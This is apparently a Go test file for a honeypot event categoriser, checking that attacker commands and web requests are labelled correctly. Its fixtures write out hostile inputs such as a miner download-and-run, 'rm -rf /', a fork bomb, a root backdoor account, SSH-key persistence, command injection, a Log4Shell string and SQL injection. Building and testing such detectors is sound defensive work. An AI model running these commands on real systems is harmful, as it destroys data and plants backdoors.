package intelligence

import (
	"context"
	"reflect"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// catEvent builds an event for a categoriser test.
func catEvent(honeypot, eventType, command, payload string) *database.Event {
	return &database.Event{Honeypot: honeypot, EventType: eventType, Command: command, Payload: []byte(payload), SourceIP: "203.0.113.9"}
}

func catHas(got []string, id string) bool {
	for _, c := range got {
		if c == id {
			return true
		}
	}
	return false
}

// TestCategorizeCatalogueIntegrity: every ID used in a rule or in the
// specificity order is a real catalogue ID, and vice versa.
func TestCategorizeCatalogueIntegrity(t *testing.T) {
	if len(categoryCatalogue) != len(categorySpecificity) {
		t.Fatalf("%d catalogue entries, %d specificity entries", len(categoryCatalogue), len(categorySpecificity))
	}
	for _, id := range categorySpecificity {
		if !IsCategory(id) {
			t.Errorf("specificity lists unknown category %q", id)
		}
	}
	for _, c := range categoryCatalogue {
		if _, ok := categoryRankOf[c.ID]; !ok {
			t.Errorf("category %q has no specificity rank", c.ID)
		}
		if c.Label == "" || c.Description == "" {
			t.Errorf("category %q missing label or description", c.ID)
		}
	}
}

// TestCategorizeShellCommands checks the shell patterns, each with a
// near-miss that must not match.
func TestCategorizeShellCommands(t *testing.T) {
	cases := []struct {
		name, command string
		want          []string
		notWant       []string
	}{
		{"wget miner", "cd /tmp; wget http://198.51.100.7/xmrig; chmod +x xmrig; ./xmrig -o stratum+tcp://pool.minexmr.com:4444",
			[]string{CatMalwareDownload, CatCryptomining}, nil},
		{"which wget is not a download", "which wget", nil, []string{CatMalwareDownload}},
		{"pkill xmrig is evasion not mining", "pkill -9 xmrig", []string{CatDefenseEvasion}, []string{CatCryptomining}},
		{"ip lookup is recon not download", "curl -s http://ifconfig.me", []string{CatRecon}, []string{CatMalwareDownload}},
		{"sudo is privesc", "sudo su -", []string{CatPrivilegeEscalation}, nil},
		{"man sudo is not privesc", "man sudo", nil, []string{CatPrivilegeEscalation}},
		{"chmod +x is not privesc", "chmod +x /tmp/x", nil, []string{CatPrivilegeEscalation}},
		{"SUID find is privesc", "find / -perm -4000 -type f 2>/dev/null", []string{CatPrivilegeEscalation}, nil},
		{"authorized_keys is persistence", "echo 'ssh-rsa AAAAB3' >> ~/.ssh/authorized_keys", []string{CatPersistence}, nil},
		{"cat authorized_keys is not persistence", "cat ~/.ssh/authorized_keys", nil, []string{CatPersistence}},
		{"useradd is persistence", "useradd -ou 0 -g 0 backup", []string{CatPersistence}, nil},
		{"man useradd is nothing", "man useradd", nil, []string{CatPersistence}},
		{"crontab write is persistence", "echo '* * * * * /tmp/.x' | crontab -", []string{CatPersistence}, nil},
		{"crontab -l is recon not persistence", "crontab -l", []string{CatRecon}, []string{CatPersistence}},
		{"history clear is evasion", "history -c; unset HISTFILE", []string{CatDefenseEvasion}, nil},
		{"iptables flush is evasion", "iptables -F", []string{CatDefenseEvasion}, nil},
		{"iptables list is not evasion", "iptables -L -n", nil, []string{CatDefenseEvasion}},
		{"shadow read is credential access", "cat /etc/shadow", []string{CatCredentialAccess}, nil},
		{"passwd read alone is not", "cat /etc/passwd", nil, []string{CatCredentialAccess}},
		{"rm -rf root is impact", "rm -rf / --no-preserve-root", []string{CatImpact}, nil},
		{"rm -rf tmp is not impact", "rm -rf /tmp/x", nil, []string{CatImpact}},
		{"fork bomb is impact", ":(){ :|:& };:", []string{CatImpact}, nil},
		{"ssh out is lateral", "sshpass -p root ssh root@198.51.100.50", []string{CatLateralMovement}, nil},
		{"ssh -D is proxy", "ssh -f -N -D 1080 user@198.51.100.50", []string{CatProxyAbuse}, nil},
		{"recon uname", "uname -a; cat /proc/cpuinfo; free -m", []string{CatRecon}, nil},
		{"echo text is nothing", "echo hello world", nil, []string{CatMalwareDownload, CatPrivilegeEscalation, CatPersistence}},
		{"ls is directory recon", "ls -la /tmp", []string{CatRecon}, nil},
		{"dir is directory recon", "dir", []string{CatRecon}, nil},
		{"mirai echo dropper is botnet", `cd /tmp; echo -ne '\x7f\x45\x4c\x46\x01\x01' > .s; busybox ECCHI`,
			[]string{CatBotnet}, nil},
		{"metadata probe is recon", "curl http://169.254.169.254/latest/meta-data/", []string{CatRecon}, nil},
	}
	for _, tc := range cases {
		got := Categorize(catEvent("cowrie", "cowrie.command.input", tc.command, ""))
		for _, w := range tc.want {
			if !catHas(got, w) {
				t.Errorf("%s: %q missing %q (got %v)", tc.name, tc.command, w, got)
			}
		}
		for _, n := range tc.notWant {
			if catHas(got, n) {
				t.Errorf("%s: %q wrongly has %q (got %v)", tc.name, tc.command, n, got)
			}
		}
	}
}

// TestCategorizeNavigationAndHousekeeping: plain navigation and housekeeping,
// alone, get no category. Each is only recon/evasion when it does the
// discovering or clearing (ls, history -c), which the cases above cover.
func TestCategorizeNavigationAndHousekeeping(t *testing.T) {
	for _, cmd := range []string{
		"cd /tmp", "cd ~", "pwd", "echo hello world", "exit", "clear", "logout",
		"history", "history 20", "whoami > /dev/null && cd /var", // cd after a recon pipe still recon; keep simple
		"true", "false", ":", "export FOO=bar",
	} {
		got := Categorize(catEvent("cowrie", "cowrie.command.input", cmd, ""))
		// whoami is recon; the mixed one is allowed to have recon only.
		if cmd == "whoami > /dev/null && cd /var" {
			if !catHas(got, CatRecon) {
				t.Errorf("%q: expected recon, got %v", cmd, got)
			}
			continue
		}
		if len(got) != 0 {
			t.Errorf("housekeeping %q got categories %v", cmd, got)
		}
	}
}

// TestCategorizeWebRequests checks the web patterns on a web honeypot's
// payload, with near-misses.
func TestCategorizeWebRequests(t *testing.T) {
	cases := []struct {
		name, payload string
		want          []string
		notWant       []string
	}{
		{"path traversal", "/download?file=../../../../etc/passwd", []string{CatPathTraversal}, nil},
		{"encoded traversal", "/x?p=..%2f..%2f..%2fetc%2fpasswd", []string{CatPathTraversal}, nil},
		{"plain relative path is not traversal", "/app/static/css/main.css", nil, []string{CatPathTraversal}},
		{"sql injection union", "/products?id=1 UNION SELECT username,password FROM users--", []string{CatSQLInjection}, nil},
		{"plain id is not sqli", "/products?id=42", nil, []string{CatSQLInjection}},
		{"xss script", "/search?q=<script>alert(document.cookie)</script>", []string{CatXSS}, nil},
		{"rfi php wrapper", "/index.php?page=php://filter/convert.base64-encode/resource=index", []string{CatFileInclusion}, nil},
		{"ssrf metadata", "/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", []string{CatSSRF}, nil},
		{"command injection", "/ping?host=127.0.0.1;wget http://198.51.100.7/x -O /tmp/x",
			[]string{CatCommandInjection, CatMalwareDownload}, nil},
		{"log4shell", "/x?q=${jndi:ldap://198.51.100.7:1389/a}", []string{CatExploitAttempt, CatCodeInjection}, nil},
		{"env file is config hunting", "/.env", []string{CatConfigExposure}, nil},
		{"git config is config hunting", "/.git/config", []string{CatConfigExposure}, nil},
		{"webshell request", "/uploads/shell.php?cmd=id", []string{CatWebShell}, nil},
		{"plain front page is scanning", "GET / HTTP/1.1", []string{CatScanning}, []string{CatSQLInjection}},
		{"robots is scanning", "/robots.txt", []string{CatScanning}, nil},
	}
	for _, tc := range cases {
		got := Categorize(catEvent("tanner", "tanner.http.get", "", tc.payload))
		for _, w := range tc.want {
			if !catHas(got, w) {
				t.Errorf("%s: %q missing %q (got %v)", tc.name, tc.payload, w, got)
			}
		}
		for _, n := range tc.notWant {
			if catHas(got, n) {
				t.Errorf("%s: %q wrongly has %q (got %v)", tc.name, tc.payload, n, got)
			}
		}
	}
}

// TestCategorizeNamedExploitsCarryCVE: a known exploit yields exploit-attempt
// and its CVE right after.
func TestCategorizeNamedExploitsCarryCVE(t *testing.T) {
	cases := []struct{ payload, cve string }{
		{"/vpns/cfg/smb.conf", "CVE-2019-19781"},
		{"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", "CVE-2018-13379"},
		{"/boaform/admin/formLogin?username=ec8&psd=ec8", ""}, // scanning path, no CVE here
	}
	for _, tc := range cases {
		got := Categorize(catEvent("tanner", "tanner.http.get", "", tc.payload))
		if tc.cve == "" {
			continue
		}
		if !catHas(got, CatExploitAttempt) {
			t.Errorf("%q: no exploit-attempt (got %v)", tc.payload, got)
			continue
		}
		// The CVE must sit immediately after exploit-attempt.
		for i, c := range got {
			if c == CatExploitAttempt {
				if i+1 >= len(got) || got[i+1] != tc.cve {
					t.Errorf("%q: expected %s after exploit-attempt, got %v", tc.payload, tc.cve, got)
				}
				break
			}
		}
	}
}

// TestCategorizeHoneypotContext: a category is only taken from a honeypot
// where the field means what the pattern assumes.
func TestCategorizeHoneypotContext(t *testing.T) {
	// A conpot connection (no command event) is not an ICS attack.
	if got := Categorize(&database.Event{Honeypot: "conpot", EventType: "conpot.modbus.new_connection", SourceIP: "203.0.113.9"}); catHas(got, CatICSAttack) {
		t.Errorf("conpot connection wrongly ICS attack: %v", got)
	}
	// Bare connection events across honeypots are scanning, including
	// dicompot's dotted-underscore name.
	for _, et := range []string{"dicompot.connection_from", "dionaea.connection.accept", "cowrie.session.connect", "conpot.modbus.new_connection"} {
		hp := strings.SplitN(et, ".", 2)[0]
		if got := Categorize(&database.Event{Honeypot: hp, EventType: et, SourceIP: "203.0.113.9"}); !catHas(got, CatScanning) {
			t.Errorf("%s not scanning: %v", et, got)
		}
	}
	// A conpot command is.
	if got := Categorize(&database.Event{Honeypot: "conpot", EventType: "conpot.modbus.command", SourceIP: "203.0.113.9"}); !catHas(got, CatICSAttack) {
		t.Errorf("conpot command not ICS attack: %v", got)
	}
	// A Redis CONFIG SET dir is database abuse; a plain INFO is scanning.
	if got := Categorize(catEvent("redishoneypot", "redishoneypot.command", "CONFIG SET dir /var/spool/cron", "")); !catHas(got, CatDatabaseAbuse) || !catHas(got, CatPersistence) {
		t.Errorf("redis config set: %v", got)
	}
	if got := Categorize(catEvent("redishoneypot", "redishoneypot.command", "INFO server", "")); !catHas(got, CatScanning) || catHas(got, CatDatabaseAbuse) {
		t.Errorf("redis INFO: %v", got)
	}
	// ddospot answers only reflection services.
	if got := Categorize(&database.Event{Honeypot: "ddospot", EventType: "ddospot.dns.request", SourceIP: "203.0.113.9"}); !catHas(got, CatAmplification) {
		t.Errorf("ddospot not amplification: %v", got)
	}
	// An SSH-session command that merely contains "../.." is not path traversal.
	if got := Categorize(catEvent("cowrie", "cowrie.command.input", "cd ../../tmp && ls", "")); catHas(got, CatPathTraversal) {
		t.Errorf("shell cd wrongly path traversal: %v", got)
	}
}

// TestCategorizeConpotOperations: what a live conpot PLC logs, through the
// collector. Reading a controller (the FC43 device identification first of
// all) is an industrial attack as much as a write; other industrial protocols
// count too, server management (IPMI) and conpot's web page do not. The end of
// a connection is not another probe.
func TestCategorizeConpotOperations(t *testing.T) {
	ics := []string{
		"conpot.modbus.read", "conpot.modbus.command", "conpot.modbus.request",
		"conpot.dnp3.read", "conpot.s7comm.request", "conpot.bacnet.request",
		"conpot.opcua.request", "conpot.ads.request", "conpot.hart_ip.request",
		"conpot.knx.request", "conpot.iccp.request", "conpot.iec104.request",
	}
	for _, et := range ics {
		ev := &database.Event{Honeypot: "conpot", EventType: et, SourceIP: "203.0.113.9",
			Metadata: map[string]string{"function_code": "43", "operation": "read"}}
		if got := Categorize(ev); !catHas(got, CatICSAttack) {
			t.Errorf("%s: %v, want ics-attack", et, got)
		}
	}
	for _, et := range []string{"conpot.ipmi.request", "conpot.http.request", "conpot.snmp.request", "conpot.modbus.readx"} {
		if got := Categorize(&database.Event{Honeypot: "conpot", EventType: et, SourceIP: "203.0.113.9"}); catHas(got, CatICSAttack) {
			t.Errorf("%s: %v, want no ics-attack", et, got)
		}
	}
	for _, et := range []string{"conpot.modbus.connection_lost", "conpot.modbus.connection_terminated",
		"conpot.s7comm.connection_closed", "conpot.http.connection_lost"} {
		if got := Categorize(&database.Event{Honeypot: "conpot", EventType: et, SourceIP: "203.0.113.9"}); len(got) != 0 {
			t.Errorf("%s: %v, want no category for the end of a connection", et, got)
		}
	}
	for _, et := range []string{"conpot.modbus.new_connection", "dionaea.connection.accept", "dicompot.connection_from"} {
		hp := strings.SplitN(et, ".", 2)[0]
		if got := Categorize(&database.Event{Honeypot: hp, EventType: et, SourceIP: "203.0.113.9"}); !catHas(got, CatScanning) {
			t.Errorf("%s: %v, want scanning", et, got)
		}
	}
}

// TestCategorizeOrderAndBounds: categories come most-specific first, and the
// count is bounded.
func TestCategorizeOrderAndBounds(t *testing.T) {
	got := Categorize(catEvent("cowrie", "cowrie.command.input",
		"uname -a; sudo su; cat /etc/shadow; wget http://198.51.100.7/xmrig; ./xmrig -o stratum+tcp://x:1/y", ""))
	if len(got) == 0 {
		t.Fatal("expected several categories")
	}
	// recon (broad) must not come before cryptomining (specific).
	ci, ri := -1, -1
	for i, c := range got {
		if c == CatCryptomining {
			ci = i
		}
		if c == CatRecon {
			ri = i
		}
	}
	if ci >= 0 && ri >= 0 && ci > ri {
		t.Errorf("recon before cryptomining: %v", got)
	}
	if len(got) > catMaxCategories+catMaxCVEs {
		t.Errorf("too many categories: %v", got)
	}
}

// TestCategorizeEmptyAndBenign: nothing interesting yields no categories.
func TestCategorizeEmptyAndBenign(t *testing.T) {
	for _, ev := range []*database.Event{
		nil,
		{},
		catEvent("cowrie", "cowrie.command.input", "echo done", ""),
		catEvent("tanner", "tanner.http.get", "", "/images/logo.png"),
	} {
		if got := Categorize(ev); len(got) != 0 {
			t.Errorf("benign event got categories %v", got)
		}
	}
}

// TestCategorizeDeterministic: the same event classifies the same way.
func TestCategorizeDeterministic(t *testing.T) {
	ev := catEvent("cowrie", "cowrie.command.input", "wget http://198.51.100.7/x; sudo su; history -c", "")
	first := Categorize(ev)
	for i := 0; i < 20; i++ {
		got := Categorize(ev)
		if !reflect.DeepEqual(got, first) {
			t.Fatalf("run %d differs: %v vs %v", i, got, first)
		}
	}
	// The order must be the specificity order.
	sorted := append([]string(nil), first...)
	sort.SliceStable(sorted, func(i, j int) bool {
		ri, rj := categoryRankOf[sorted[i]], categoryRankOf[sorted[j]]
		if sorted[i] == "" || !IsCategory(sorted[i]) {
			ri = 1 << 30 // CVEs sort to the end; they are checked separately
		}
		if sorted[j] == "" || !IsCategory(sorted[j]) {
			rj = 1 << 30
		}
		return ri < rj
	})
	// Drop CVEs for the order comparison.
	var ids []string
	for _, c := range first {
		if IsCategory(c) {
			ids = append(ids, c)
		}
	}
	for i := 1; i < len(ids); i++ {
		if categoryRankOf[ids[i-1]] > categoryRankOf[ids[i]] {
			t.Errorf("not in specificity order: %v", ids)
		}
	}
}

// TestCategorizeHostileInputIsFast: a large hostile payload (long runs of the
// characters the patterns branch on, deeply nested wrappers) must classify
// quickly. RE2 is linear, but this guards against a counted-repetition or
// backtracking-shaped pattern slipping in.
func TestCategorizeHostileInputIsFast(t *testing.T) {
	// Each raw field is capped at catMaxField before matching, so sizing
	// these past that only exercises the truncation. The budget is generous:
	// the point is to catch a non-linear (seconds-to-minutes) blowup, not to
	// pin a millisecond figure that flakes on a loaded machine.
	hostile := []string{
		strings.Repeat("../", 40000),
		strings.Repeat("${", 20000) + strings.Repeat("}", 20000),
		strings.Repeat("a' OR '1'='1 UNION SELECT ", 4000),
		strings.Repeat("/x?page=http://169.254.169.254/", 2000),
		strings.Repeat("wget http://a/", 4000),
		strings.Repeat("%", 60000),
		strings.Repeat("$(", 20000) + strings.Repeat(")", 20000),
		strings.Repeat("<script>", 8000),
		strings.Repeat(";sudo ", 10000),
		strings.Repeat("ssh-rsa AAAA ", 5000),
	}
	// The race detector slows every instruction several times over; the
	// budget still catches a blowup of seconds to minutes there.
	budget := 2 * time.Second
	if catRaceEnabled {
		budget *= 10
	}
	for _, hp := range []string{"cowrie", "tanner", "redishoneypot"} {
		for _, payload := range hostile {
			ev := &database.Event{Honeypot: hp, EventType: hp + ".http.get", Protocol: "http",
				Command: payload, Payload: []byte(payload)}
			start := time.Now()
			cats := Categorize(ev)
			if d := time.Since(start); d > budget {
				t.Errorf("%s: a %d-byte payload took %v", hp, len(payload), d)
			}
			if len(cats) > catMaxCategories+catMaxCVEs {
				t.Errorf("%s: %d categories", hp, len(cats))
			}
		}
	}
}

// BenchmarkCategorizeShell measures the categoriser on a realistic multi-stage
// shell command (the worker runs it on every event).
func BenchmarkCategorizeShell(b *testing.B) {
	ev := catEvent("cowrie", "cowrie.command.input",
		"uname -a; wget http://198.51.100.7/xmrig -O /tmp/x; chmod +x /tmp/x; ./x -o stratum+tcp://pool:3333/w; history -c; echo key >> ~/.ssh/authorized_keys", "")
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = Categorize(ev)
	}
}

// BenchmarkCategorizeLargeWeb measures a large hostile web payload.
func BenchmarkCategorizeLargeWeb(b *testing.B) {
	ev := &database.Event{Honeypot: "tanner", EventType: "tanner.http.get", Protocol: "http",
		Payload: []byte(strings.Repeat("/x?page=../../etc/passwd&q=1' UNION SELECT 1-- ", 1000))}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = Categorize(ev)
	}
}

// TestClassifierSetsCategories: the classifier fills Event.Categories and the
// curated rule that keys on them agrees with the technique.
func TestClassifierSetsCategories(t *testing.T) {
	c := newTestClassifierT(t)
	ev := catEvent("cowrie", "cowrie.command.input", "wget http://198.51.100.7/x -O /tmp/x", "")
	c.Classify(context.Background(), ev)
	if !catHas(ev.Categories, CatMalwareDownload) {
		t.Errorf("classifier did not set malware-download: %v", ev.Categories)
	}
	if ev.TechniqueID != "T1105" {
		t.Errorf("download technique = %q, want T1105", ev.TechniqueID)
	}

	// A big hostile command still classifies and bounds its categories.
	big := strings.Repeat("A", 200000) + "; rm -rf / --no-preserve-root"
	ev = catEvent("cowrie", "cowrie.command.input", big, "")
	c.Classify(context.Background(), ev)
	if len(ev.Categories) > catMaxCategories+catMaxCVEs {
		t.Errorf("hostile command: %d categories", len(ev.Categories))
	}
}
